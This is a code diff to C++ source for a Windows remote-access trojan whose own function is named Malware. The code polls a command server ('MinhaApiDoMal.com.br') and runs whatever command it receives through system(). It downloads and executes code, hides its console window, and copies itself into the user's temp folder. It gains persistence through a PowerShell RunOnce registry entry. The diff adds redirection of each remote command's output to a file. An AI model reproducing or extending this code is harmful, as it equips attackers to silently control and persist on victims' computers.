@@ -137,6 +137,16 @@ void ExecByHex(string url,string urlAction)
   system(command.c_str());
   remove(fileName.c_str());
 }
+string GetOutput()
+{
+  char username[UNLEN+1];
+  DWORD username_len = UNLEN+1;
+  GetUserName(username, &username_len);
+  string pathUsers = "C:\\Users\\";
+  string pathTarget = "\\appdata\\local\\temp\\";
+  return pathUsers+username+pathTarget;
+}
+
 void Malware()
 {
   string url = "MinhaApiDoMal.com.br";
@@ -158,6 +168,7 @@ void Malware()
       int time = stoi(DeserializeJson("time",htmlResponse));
       if(command != urlActionCommand && command != "null" && commandCharArray[0] != '#')
       {
+        command += "> "+GetOutput()+"output.txt";
         system(command.c_str());
         Sleep(time);
       }
@@ -184,20 +195,14 @@ string current_working_directory()
   free(cwd) ;
   return working_directory ;
 }
-void InitConfig(string currentProgramName)
+void InitConfig(string currentProgramName,string output)
 {
   HWND window;
   AllocConsole();
   window = FindWindowA("ConsoleWindowClass", NULL);
   ShowWindow(window,0);
-  char username[UNLEN+1];
-  DWORD username_len = UNLEN+1;
-  GetUserName(username, &username_len);
   string finalProgramName = "mainFinal.exe";
-  string pathUsers = "C:\\Users\\";
-  string pathTarget = "\\appdata\\local\\temp\\";
   string input = current_working_directory()+"\\"+currentProgramName;
-  string output = pathUsers+username+pathTarget;
   CopyFile(input.c_str(),(output+finalProgramName).c_str(), TRUE);
   string commandPowerShell = "powershell New-ItemProperty -Path HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce -name mainsubprocess -Value "+output+finalProgramName+" -force";
   system(commandPowerShell.c_str());
